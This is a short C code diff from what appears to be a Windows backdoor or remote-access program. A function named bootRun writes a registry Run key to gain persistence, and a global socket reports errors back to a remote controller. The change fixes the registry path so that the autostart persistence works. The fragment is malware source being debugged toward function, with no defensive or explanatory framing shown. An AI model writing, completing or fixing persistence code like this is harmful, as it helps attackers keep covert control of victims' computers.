@@ -24,6 +24,7 @@
 //Global Variable denotes here
 int sock;
 
+
 //Lets Code the bootrun function here..
 int bootRun()
 {
@@ -56,7 +57,7 @@ int bootRun()
   HKEY NewVal; // used to handle open registry key.
 
   //Now open up the registry and add the key value into it.
-  if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
+  if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
   {
     //send the error to socket to notify it.
     send(sock, err, sizeof(err), 0);
